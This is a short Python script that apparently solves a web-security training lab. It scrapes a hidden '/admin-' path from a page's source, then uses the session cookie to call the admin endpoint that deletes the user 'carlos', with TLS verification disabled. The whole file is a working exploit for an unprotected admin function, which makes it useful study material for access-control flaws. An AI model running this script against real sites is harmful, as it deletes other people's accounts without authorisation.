import requests
import urllib3
from bs4 import BeautifulSoup
import sys
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def delete_user(url):
    try:

        r = requests.get(url, verify=False)
    except(requests.exceptions.ConnectionError):
        print("Lab link is down try new one")
        sys.exit(-1)
        

    session_cookie = r.cookies.get_dict().get('session')#to get the session cookies
    #finding the admin path
    soup = BeautifulSoup(r.text,'lxml')

    admin_instances = soup.find(string=re.compile("/admin-"))

    admin_path = re.search("href', (.*)'",admin_instances).group(1)

    admin_path=admin_path[1:]

    delete_carlos = url + admin_path + "/delete?username=carlos"

    cookie = {'session':session_cookie}

    r = requests.get(delete_carlos,cookies=cookie,verify=False)

    if r.status_code == 200:
         print("[✅] Carlos delete successfully")
    else:
        print("[🚫] could not deleted user.")
        print("[🔚]Exiting the Script")
    

def main():
    if len(sys.argv) !=2:
        print("(🛠️) Usage: %s <url>"% sys.argv[0])
        print("(👉) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[❌] Deleting Carlos...")
    delete_user(url)



if __name__  == "__main__":
    main()